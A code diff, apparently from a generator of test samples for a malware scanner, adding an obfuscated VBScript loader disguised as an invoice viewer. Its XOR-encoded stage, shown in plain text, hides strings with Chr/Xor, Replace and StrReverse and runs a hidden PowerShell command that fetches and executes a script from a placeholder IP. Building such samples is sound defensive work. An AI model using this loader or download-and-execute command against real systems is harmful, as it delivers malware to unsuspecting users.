@@ -1281,6 +1281,32 @@ def invoke_obfuscation_ps1() -> bytes:
     return ("# Factura 2024-0613 - visor\n" + l4 + "\n").encode("utf-8")
 
 
+def xor_loader_vbs() -> bytes:
+    """VBScript loader (inert) with the classic decryptor loop: the stage is hex
+    text XOR'ed with a string key, rebuilt in a For loop and run with Execute.
+    The stage itself hides strings behind Chr(x Xor y), Replace and StrReverse,
+    then downloads the "invoice" with MSXML2.XMLHTTP and starts PowerShell."""
+    key = "Factura0613"
+    stage = (
+        'Set h = CreateObject(Replace("MSXQQML2.XMLHQQTTP", "QQ", ""))\r\n'
+        'h.Open "GET", "http://invoice-cdn.example/" & StrReverse("fdp.3160-4202_arutcaF"), False\r\n'
+        'h.Send\r\n'
+        'Set sh = CreateObject("WScript." & Chr(83 Xor 0) & Chr(&H68) & "ell")\r\n'
+        'sh.Run "powershell -w hidden -c iwr http://198.51.100.23/inv.ps1 | iex", 0, False'
+    )
+    enc = "".join(f"{ord(c) ^ ord(key[i % len(key)]):02x}" for i, c in enumerate(stage))
+    chunks = [enc[i:i + 96] for i in range(0, len(enc), 96)]
+    body = 'd = "' + chunks[0] + '"\r\n' + "".join(f'd = d & "{c}"\r\n' for c in chunks[1:])
+    return ("' Factura 2024-0613 - visor de facturas\r\n"
+            "Option Explicit\r\nDim d, k, i, s\r\n"
+            f'k = "{key}"\r\n' + body +
+            "s = \"\"\r\n"
+            "For i = 1 To Len(d) Step 2\r\n"
+            '  s = s & Chr(CLng("&H" & Mid(d, i, 2)) Xor Asc(Mid(k, ((i \\ 2) Mod Len(k)) + 1, 1)))\r\n'
+            "Next\r\n"
+            "Execute s\r\n").encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1290,7 +1316,7 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
         "sample_chain_dropper.js": chain_dropper_js(), "sample_msxml_dropper.js": msxml_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
-        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(),
+        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(), "sample_xor_loader.vbs": xor_loader_vbs(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
